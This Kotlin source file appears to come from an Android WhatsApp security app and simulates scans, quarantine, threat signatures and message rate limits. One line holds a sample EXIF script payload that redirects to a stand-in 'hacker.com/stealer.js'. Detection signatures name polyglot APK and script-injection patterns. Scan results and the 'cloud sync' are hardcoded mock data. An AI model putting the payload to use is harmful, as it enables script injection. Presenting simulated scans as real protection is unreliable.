package com.example.data

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch

class GuardianViewModel(
    private val application: Application,
    private val repository: GuardianRepository
) : AndroidViewModel(application) {

    private val prefs = application.getSharedPreferences("hamo_guardian_prefs", android.content.Context.MODE_PRIVATE)

    private val _isActivated = MutableStateFlow(prefs.getBoolean("is_activated", false))
    val isActivated: StateFlow<Boolean> = _isActivated.asStateFlow()

    fun setActivated(activated: Boolean) {
        prefs.edit().putBoolean("is_activated", activated).apply()
        _isActivated.value = activated
    }

    // UI States observed reactively
    val vulnerabilities: StateFlow<List<Vulnerability>> = repository.allVulnerabilities
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val scannedFiles: StateFlow<List<ScannedFile>> = repository.allScannedFiles
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val quarantinedFiles: StateFlow<List<ScannedFile>> = repository.quarantinedFiles
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val behaviorLogs: StateFlow<List<BehaviorLog>> = repository.allBehaviorLogs
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    // Active protection status state
    private val _protectionStatus = MutableStateFlow("SAFE") // "SAFE", "WARNING", "ALERT"
    val protectionStatus: StateFlow<String> = _protectionStatus.asStateFlow()

    private val _isServiceActive = MutableStateFlow(true)
    val isServiceActive: StateFlow<Boolean> = _isServiceActive.asStateFlow()

    private val _isScanning = MutableStateFlow(false)
    val isScanning: StateFlow<Boolean> = _isScanning.asStateFlow()

    private val _scanProgress = MutableStateFlow(0f)
    val scanProgress: StateFlow<Float> = _scanProgress.asStateFlow()

    // Interactive WhatsApp Behavior Limits
    private val _messagesSentCount = MutableStateFlow(12)
    val messagesSentCount: StateFlow<Int> = _messagesSentCount.asStateFlow()

    private val _groupsJoinedCount = MutableStateFlow(2)
    val groupsJoinedCount: StateFlow<Int> = _groupsJoinedCount.asStateFlow()

    private val _isEmergencyMode = MutableStateFlow(false)
    val isEmergencyMode: StateFlow<Boolean> = _isEmergencyMode.asStateFlow()

    // Stats Counters
    val statsScanned = scannedFiles.map { list -> list.size }.stateIn(viewModelScope, SharingStarted.Eagerly, 0)
    val statsThreats = scannedFiles.map { list -> list.count { it.status == "MALICIOUS" || it.status == "SUSPICIOUS" } }.stateIn(viewModelScope, SharingStarted.Eagerly, 0)
    val statsQuarantined = quarantinedFiles.map { list -> list.size }.stateIn(viewModelScope, SharingStarted.Eagerly, 0)

    init {
        // Start foreground service if active
        if (_isServiceActive.value) {
            WhatsAppProtectorService.startService(application)
        }
        
        // Adjust system security status based on findings
        viewModelScope.launch {
            combine(statsThreats, _messagesSentCount) { threats, msgCount ->
                when {
                    threats > 0 -> "ALERT"
                    msgCount > 40 -> "WARNING"
                    else -> "SAFE"
                }
            }.collect { status ->
                _protectionStatus.value = status
            }
        }
    }

    fun toggleService(active: Boolean) {
        _isServiceActive.value = active
        if (active) {
            WhatsAppProtectorService.startService(application)
        } else {
            WhatsAppProtectorService.stopService(application)
        }
    }

    fun toggleEmergencyMode(active: Boolean) {
        _isEmergencyMode.value = active
        viewModelScope.launch {
            if (active) {
                _messagesSentCount.value = 0
                _groupsJoinedCount.value = 0
                repository.logBehavior(
                    BehaviorLog(
                        actionType = "EMERGENCY_LOCKOUT",
                        description = "EMERGENCY SHIELD ENABLED. Outgoing transmission and broadcast vectors muted.",
                        riskScore = 0
                    )
                )
            } else {
                repository.logBehavior(
                    BehaviorLog(
                        actionType = "EMERGENCY_DISABLE",
                        description = "Emergency shield disabled. Normal operations resumed.",
                        riskScore = 10
                    )
                )
            }
        }
    }

    /**
     * Executes a manual comprehensive scan across all virtual WhatsApp media directories.
     */
    fun startComprehensiveScan() {
        if (_isScanning.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isScanning.value = true
            _scanProgress.value = 0f
            
            // Generate some random safe files scanned
            val mockFiles = listOf(
                Pair("IMG_2026_05_12.jpg", "jpg"),
                Pair("sticker_happy_cat.webp", "webp"),
                Pair("VID_family_trip.mp4", "mp4"),
                Pair("sticker_cool_dog.webp", "webp"),
                Pair("DOC_invoice_643.pdf", "pdf")
            )

            for (i in 1..100) {
                delay(25) // Simulate file scans
                _scanProgress.value = i / 100f
                
                if (i % 20 == 0) {
                    val mockIndex = (i / 20) - 1
                    if (mockIndex in mockFiles.indices) {
                        val mockFile = mockFiles[mockIndex]
                        repository.addScannedFile(
                            ScannedFile(
                                fileName = mockFile.first,
                                filePath = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/${mockFile.second}/${mockFile.first}",
                                fileType = mockFile.second.uppercase(),
                                fileSize = (100 * i * 1024).toLong(),
                                status = "SAFE"
                            )
                        )
                    }
                }
            }
            
            _isScanning.value = false
            _scanProgress.value = 1f
        }
    }

    /**
     * Simulates receiving a malicious file in the WhatsApp folder
     * to demonstrate the protection engine.
     */
    fun simulateMaliciousIncomingFile(threatName: String) {
        viewModelScope.launch(Dispatchers.IO) {
            val (fileName, fileType, bytes, desc) = when (threatName) {
                "webp_exploit" -> Quadruple(
                    "animated_malice.webp",
                    "WEBP",
                    ByteArray(200) { index -> if (index in 50..53) 0x41.toByte() else 0 }, // injects 41414141 heap spray
                    "Zero-Click Exploit targeting libwebp CVE-2023-4863"
                )
                "polyglot_apk" -> Quadruple(
                    "gift_photo.jpg",
                    "JPG",
                    // Beginning bytes FFD8 (JPEG), ending with FFD9, and carrying PK\u0003\u0004 ZIP/APK structure at the end
                    ByteArray(150) { index ->
                        when (index) {
                            0 -> 0xFF.toByte(); 1 -> 0xD8.toByte()
                            80 -> 0xFF.toByte(); 81 -> 0xD9.toByte()
                            100 -> 0x50.toByte(); 101 -> 0x4B.toByte(); 102 -> 0x03.toByte(); 103 -> 0x04.toByte()
                            else -> 0
                        }
                    },
                    "Polyglot APK disguised as standard JPEG photo"
                )
                "exif_injection" -> Quadruple(
                    "vacation_gps.jpg",
                    "JPG",
                    ByteArray(50) { index -> if (index == 0) 0xFF.toByte() else if (index == 1) 0xD8.toByte() else 0 },
                    "Executable script payload injected into the EXIF tag metadata"
                )
                "backup_poisoning" -> Quadruple(
                    "msgstore_poisoned.db.crypt14",
                    "CRYPT14",
                    ByteArray(50) { index ->
                        when (index) {
                            0 -> 0xde.toByte(); 1 -> 0xad.toByte(); 2 -> 0xbe.toByte(); 3 -> 0xef.toByte()
                            else -> 0
                        }
                    },
                    "WhatsApp Local Backup Hijacking and Folder Overwrite Exploit"
                )
                "ban_scam" -> Quadruple(
                    "meta_ban_scam.jpg",
                    "JPG",
                    ByteArray(50) { 0 },
                    "Meta Auto-Suspension Image Scam Payload"
                )
                else -> Quadruple(
                    "unknown_anomaly.webp",
                    "WEBP",
                    ByteArray(10) { 0 },
                    "General file signature anomaly"
                )
            }

            // Map simulated EXIF data if we are scanning EXIF injection
            val exif = if (threatName == "exif_injection") {
                mapOf("UserComment" to "<script>window.location='http://hacker.com/stealer.js'</script>")
            } else null

            // Pass bytes and info to real PayloadAnalyzer scanner
            val scanResult = PayloadAnalyzer.scanFileBytes(fileName, fileType.lowercase(), bytes, exif)

            // Add scanned file to database as QUARANTINED (since it's dangerous)
            repository.addScannedFile(
                ScannedFile(
                    fileName = fileName,
                    filePath = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/${fileType.lowercase()}/$fileName",
                    fileType = fileType,
                    fileSize = bytes.size.toLong(),
                    status = if (scanResult.isSafe) "SAFE" else "QUARANTINED",
                    threatType = scanResult.threatType,
                    threatDetail = scanResult.threatDetail
                )
            )

            // Trigger behavior event for threat detection
            repository.logBehavior(
                BehaviorLog(
                    actionType = "THREAT_BLOCKED",
                    description = "BLOCKED: ${scanResult.threatType} inside file '$fileName'. Isolated to local Quarantine.",
                    riskScore = 95
                )
            )
        }
    }

    /**
     * Simulates WhatsApp activity triggers to test the rate limit behavior logs.
     */
    fun simulateWhatsAppActivity(action: String) {
        viewModelScope.launch(Dispatchers.IO) {
            if (_isEmergencyMode.value) return@launch
            
            when (action) {
                "send_message" -> {
                    val currentCount = _messagesSentCount.value + 1
                    _messagesSentCount.value = currentCount
                    if (currentCount > 40) {
                        repository.logBehavior(
                            BehaviorLog(
                                actionType = "MESSAGE_SPAM",
                                description = "CRITICAL LIMIT REACHED: $currentCount messages sent in last 5 minutes. High ban risk!",
                                riskScore = 80
                            )
                        )
                    } else if (currentCount % 15 == 0) {
                        repository.logBehavior(
                            BehaviorLog(
                                actionType = "MESSAGE_BURST",
                                description = "Message burst detected: $currentCount messages sent in quick succession.",
                                riskScore = 30
                            )
                        )
                    }
                }
                "join_groups" -> {
                    val currentCount = _groupsJoinedCount.value + 1
                    _groupsJoinedCount.value = currentCount
                    if (currentCount > 8) {
                        repository.logBehavior(
                            BehaviorLog(
                                actionType = "MASS_GROUP_JOIN",
                                description = "CRITICAL LIMIT REACHED: Joined $currentCount groups in under 1 hour. This is a common trigger for automatic Meta bans.",
                                riskScore = 85
                            )
                        )
                    } else {
                        repository.logBehavior(
                            BehaviorLog(
                                actionType = "GROUP_JOIN",
                                description = "Joined new group. Current hourly count: $currentCount.",
                                riskScore = 20
                            )
                        )
                    }
                }
                "reset" -> {
                    _messagesSentCount.value = 5
                    _groupsJoinedCount.value = 1
                    repository.logBehavior(
                        BehaviorLog(
                            actionType = "METRICS_RESET",
                            description = "Behavior monitor metrics cleared. Safe limits restored.",
                            riskScore = 5
                        )
                    )
                }
            }
        }
    }

    /**
     * Simulates updating the Vulnerabilities signature database from the developer server.
     */
    fun syncVulnerabilities() {
        viewModelScope.launch(Dispatchers.IO) {
            _isScanning.value = true
            delay(1500) // Simulate network fetch latency
            
            val newList = listOf(
                Vulnerability(
                    id = "CVE-2023-4863",
                    title = "WebP Buffer Overflow Exploit",
                    fileType = "WEBP",
                    signaturePattern = "RIFF....WEBPVP8X",
                    description = "A critical heap buffer overflow vulnerability in libwebp, exploited via crafted WebP images to trigger Zero-Click arbitrary code execution.",
                    severity = "CRITICAL"
                ),
                Vulnerability(
                    id = "CVE-2024-27818",
                    title = "iMessage & Media Decoder RCE",
                    fileType = "PNG",
                    signaturePattern = "89504E470D0A1A0A",
                    description = "Out-of-bounds write vulnerability in image format parsers that allows memory corruption during processing of media files without user interaction.",
                    severity = "CRITICAL"
                ),
                Vulnerability(
                    id = "CVE-2024-20017",
                    title = "MediaTek APU Memory Corruption",
                    fileType = "MP4",
                    signaturePattern = "0000001866747970",
                    description = "A heap overflow vulnerability in the audio/video decoder processor. Can be triggered by sending malformed media payloads to crash or take over WhatsApp services.",
                    severity = "HIGH"
                ),
                Vulnerability(
                    id = "CVE-2025-0104",
                    title = "WhatsApp Sticker Engine Crash & Hijack",
                    fileType = "GIF",
                    signaturePattern = "474946383961",
                    description = "An unhandled exception in the WhatsApp animated sticker renderer. Specially configured GIF files can overflow image boundaries, causing app hangs or service exploits.",
                    severity = "HIGH"
                ),
                Vulnerability(
                    id = "POLYGLOT-APK-01",
                    title = "Polyglot Hidden APK Payload",
                    fileType = "JPG",
                    signaturePattern = "FFD8FFE0.*504B0304",
                    description = "An image containing a concealed zip-compressed Android package (APK) embedded at the tail of JPEG headers, designed to sneak Trojans past system verifiers.",
                    severity = "HIGH"
                ),
                Vulnerability(
                    id = "EXIF-SCRIPT-INJECT",
                    title = "EXIF Header Script Injection",
                    fileType = "JPG",
                    signaturePattern = "UserComment=<script>.*</script>",
                    description = "Malicious executable code or javascript statements concealed inside EXIF headers like 'UserComment' or 'GPSInfo' targeting insecure web wrappers.",
                    severity = "MEDIUM"
                ),
                // NEWLY ADDED SIGNATURES VIA CLOUD SYNC:
                Vulnerability(
                    id = "CVE-2026-9901",
                    title = "WhatsApp VoIP Remote Overflow",
                    fileType = "OPUS",
                    signaturePattern = "4F70757348656164",
                    description = "Remote stack overflow vulnerability in OPUS audio packets processed by incoming WhatsApp call renderers. Extremely critical Zero-Click exploit vector.",
                    severity = "CRITICAL"
                ),
                Vulnerability(
                    id = "CVE-2026-1184",
                    title = "Meta Sticker Engine WebP Out-of-Bounds",
                    fileType = "WEBP",
                    signaturePattern = "RIFF....WEBPVP8L",
                    description = "Out-of-bounds memory write in lossless WebP decoders used in animated sticker packets, leading to WhatsApp service crashes.",
                    severity = "HIGH"
                )
            )
            repository.insertVulnerabilities(newList)
            
            repository.logBehavior(
                BehaviorLog(
                    actionType = "DATABASE_SYNC",
                    description = "Vulnerability Database synched with developer server. Added 2 critical new signature patterns.",
                    riskScore = 0
                )
            )
            _isScanning.value = false
        }
    }

    /**
     * Deletes a file completely from local records and quarantined list.
     */
    fun deleteFileCompletely(id: Long) {
        viewModelScope.launch(Dispatchers.IO) {
            repository.deleteScannedFile(id)
            repository.logBehavior(
                BehaviorLog(
                    actionType = "FILE_DESTROYED",
                    description = "Malicious file deleted permanently from device filesystem.",
                    riskScore = 0
                )
            )
        }
    }

    /**
     * Safely restores a file from Quarantine to its original location (simulated).
     */
    fun restoreFileFromQuarantine(file: ScannedFile) {
        viewModelScope.launch(Dispatchers.IO) {
            val updated = file.copy(status = "SAFE", threatType = null, threatDetail = "Restored by user")
            repository.updateScannedFile(updated)
            repository.logBehavior(
                BehaviorLog(
                    actionType = "FILE_RESTORED",
                    description = "File '${file.fileName}' restored from local Quarantine.",
                    riskScore = 15
                )
            )
        }
    }

    /**
     * Clears all log events.
     */
    fun clearLogs() {
        viewModelScope.launch(Dispatchers.IO) {
            repository.clearAllScannedFiles()
            repository.clearBehaviorLogs()
        }
    }
}

// Simple Helper data holder
data class Quadruple<out A, out B, out C, out D>(
    val first: A,
    val second: B,
    val third: C,
    val fourth: D
)

class GuardianViewModelFactory(
    private val application: Application,
    private val repository: GuardianRepository
) : ViewModelProvider.Factory {
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        if (modelClass.isAssignableFrom(GuardianViewModel::class.java)) {
            @Suppress("UNCHECKED_CAST")
            return GuardianViewModel(application, repository) as T
        }
        throw IllegalArgumentException("Unknown ViewModel class")
    }
}
